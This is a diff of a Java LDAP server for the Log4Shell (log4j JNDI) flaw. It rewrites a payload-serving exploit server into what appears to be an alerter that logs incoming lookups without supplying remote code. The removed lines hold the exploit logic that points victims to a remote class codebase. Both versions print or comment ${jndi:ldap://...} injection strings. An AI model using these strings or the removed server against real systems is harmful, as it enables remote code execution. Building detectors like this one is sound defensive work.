@@ -10,35 +10,29 @@ import com.unboundid.ldap.sdk.LDAPException;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 
-import javax.naming.directory.InitialDirContext;
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
 import javax.net.ssl.SSLSocketFactory;
+import java.io.IOException;
 import java.net.InetAddress;
 
-public class LDAPServer extends InMemoryOperationInterceptor {
+public class MainAlerter extends InMemoryOperationInterceptor {
+    public static int port = 1389;
+    public static String address = "0.0.0.0";
 
-
-    public String host = "http://" + Main.address + ":" + Main.port + "/";
-
-    //to test thing
-    public static void main(String[] args) {
-        InitialDirContext idc = null;
-        //false positive check
-        if (LDAPServer.class.getClassLoader().getResource(Main.defaultPayload.replace('.', '/') + ".class") != null) {
-            throw new RuntimeException("payload already exists in current classloader");
+    public static void main(String[] args) throws IOException, LDAPException {
+        if (args.length != 0) {
+            String[] addressAndPort = args[0].split(":");
+            address = addressAndPort[0];
+            if (addressAndPort.length == 2) {
+                port = Integer.parseInt(addressAndPort[1]);
+            }
         }
-        try {
-            idc = new InitialDirContext();
-            //log4j: ${jndi:ldap://localhost:1389/o=reference,payload=itzbenz.payload.RickRoll}
-            Object o = idc.lookup("ldap://localhost:1389/o=reference,payload=itzbenz.payload.RickRoll");
-            System.out.println(o);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    public void start() throws Exception {
+        System.out.println();
+        System.out.println();
+        System.out.println("${jndi:ldap://" + address + ":" + port + "/o=reference,payload=Vulnerable}");
+        System.out.println();
+        System.out.println();
         System.out.println("Starting LDAP server on 0.0.0.0:1389");
         InMemoryDirectoryServerConfig inMemoryOperationInterceptor = new InMemoryDirectoryServerConfig("dc=example,dc=com");
         inMemoryOperationInterceptor.setListenerConfigs(new InMemoryListenerConfig(
@@ -48,34 +42,26 @@ public class LDAPServer extends InMemoryOperationInterceptor {
                 ServerSocketFactory.getDefault(),
                 SocketFactory.getDefault(),
                 (SSLSocketFactory) SSLSocketFactory.getDefault()));
-        inMemoryOperationInterceptor.addInMemoryOperationInterceptor(this);
+        inMemoryOperationInterceptor.addInMemoryOperationInterceptor(new MainAlerter());
         InMemoryDirectoryServer ds = new InMemoryDirectoryServer(inMemoryOperationInterceptor);
         ds.startListening();
-
     }
 
     @Override
     public void processSearchResult(InMemoryInterceptedSearchResult result) {
         String base = result.getRequest().getBaseDN();
-        String payload;
+        String payload = base;
         try {
             payload = base.split(",")[1].split("=")[1];
-        } catch (Exception e) {
-            System.err.println("Malformed payload: " + e.getMessage());
-            return;
+        } catch (IndexOutOfBoundsException e) {
+            //System.out.println("Malformed Payload Skipping Parse");
         }
         System.out.println();
         System.out.println("[+] Requested Payload: " + payload);
-        if (!Main.payloadExists(payload)) {
-            payload = Main.defaultPayload;
-            System.err.println("[-] Payload not found, using default: " + payload);
-        }
         Entry e = new Entry(base);
-        System.out.println("Sending LDAP reference result for " + host + payload.replace('.', '/') + ".class");
         e.addAttribute("objectClass", "javaNamingReference");//cool
-        e.addAttribute("javaClassName", payload); //unknown if fail
-        e.addAttribute("javaFactory", payload); //magic payload
-        e.addAttribute("javaCodeBase", host);
+        e.addAttribute("javaClassName", "Vulnerable.Log4Shellllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll"); //unknown if fail
+        e.addAttribute("javaFactory", "Vulnerable.Log4Shellllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll"); //magic payload
         try {
             result.sendSearchEntry(e);
         } catch (LDAPException ex) {
@@ -83,6 +69,5 @@ public class LDAPServer extends InMemoryOperationInterceptor {
         }
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS));//great success
     }
-
 
 }
